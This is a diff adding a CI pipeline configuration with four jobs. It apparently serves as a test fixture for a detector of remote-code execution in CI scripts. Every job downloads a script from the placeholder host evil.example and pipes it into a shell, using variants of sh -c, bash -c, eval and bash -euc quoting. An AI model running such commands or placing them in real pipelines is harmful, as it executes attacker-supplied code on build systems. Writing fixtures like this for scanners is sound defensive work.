@@ -1,0 +1,19 @@
+sh_c_double_quoted:
+  image: alpine:3.19
+  script:
+    - sh -c "curl -fsSL https://evil.example/x.sh | bash"
+
+bash_c_single_quoted:
+  image: alpine:3.19
+  script:
+    - bash -c 'wget -qO- https://evil.example/x | sh'
+
+eval_double_quoted:
+  image: alpine:3.19
+  script:
+    - eval "curl -s https://evil.example/x | bash"
+
+bash_euc_flags:
+  image: alpine:3.19
+  script:
+    - bash -euc "curl -s https://evil.example/x | sh"
